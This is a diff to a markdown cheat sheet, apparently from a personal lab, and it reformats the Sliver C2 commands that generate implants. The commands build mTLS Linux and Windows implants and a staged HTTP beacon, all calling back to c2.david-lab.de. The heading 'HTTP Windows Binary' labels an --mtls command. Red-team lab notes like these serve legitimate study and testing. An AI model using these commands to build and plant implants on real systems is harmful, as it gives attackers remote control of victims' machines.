@@ -21,17 +21,17 @@ Listeners are required to catch incoming connections from implants or payload de
 Implants are the actual malware binaries executed on the target system. 
 
 * **mTLS Linux Binary (64-bit):**
-  ```sliver
-  generate --mtls c2.david-lab.de --os linux --arch amd64 --save /tmp/
-  ```
+```bash
+> generate --mtls c2.david-lab.de --os linux --arch amd64 --save /tmp/
+```
 * **HTTP Windows Binary (64-bit):**
-  ```sliver
-  generate --mtls c2.david-lab.de --os windows --arch amd64 --save /tmp/
-  ```
+```bash
+> generate --mtls c2.david-lab.de --os windows --arch amd64 --save /tmp/
+```
 * **Staged Payload (Beacon):**
-  ```sliver
-  generate beacon --http c2.david-lab.de --os windows --arch amd64
-  ```
+```bash
+> generate beacon --http c2.david-lab.de --os windows --arch amd64
+```
 
 --- 
 
